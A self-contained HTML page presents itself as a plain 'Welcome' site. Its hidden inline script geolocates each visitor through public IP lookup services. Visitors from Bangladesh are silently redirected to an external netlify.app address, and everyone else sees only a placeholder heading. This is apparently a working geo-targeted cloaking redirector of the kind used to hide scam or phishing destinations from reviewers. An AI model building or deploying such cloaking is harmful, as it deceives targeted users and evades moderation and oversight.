<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome</title>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      min-height: 100%;
      background: #ffffff;
    }

    body {
      display: none;
    }
  </style>
</head>

<body>
  <script>
    (async function () {
      "use strict";

      const TARGET_URL = "https://learnmoreinfo.netlify.app/";

      async function getCountry(url) {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 5000);

        try {
          const response = await fetch(url, {
            cache: "no-store",
            signal: controller.signal
          });

          if (!response.ok) {
            throw new Error("Country API unavailable");
          }

          return (await response.text()).trim();
        } finally {
          clearTimeout(timer);
        }
      }

      try {
        let country = "";

        try {
          country = await getCountry("https://ipapi.co/country/");
        } catch (error) {
          try {
            const response = await fetch("https://ipwho.is/", {
              cache: "no-store"
            });

            if (!response.ok) throw new Error("API unavailable");

            const data = await response.json();
            country = data.country_code || "";
          } catch (secondError) {
            country = "";
          }
        }

        if (country === "BD") {
          window.location.replace(TARGET_URL);
        } else {
          document.body.style.display = "block";
          document.body.innerHTML =
            '<main style="font-family:Arial,sans-serif;text-align:center;padding:40px">' +
            '<h1>Welcome My Site</h1></main>';
        }
      } catch (error) {
        document.body.style.display = "block";
      }
    })();
  </script>
</body>
</html>
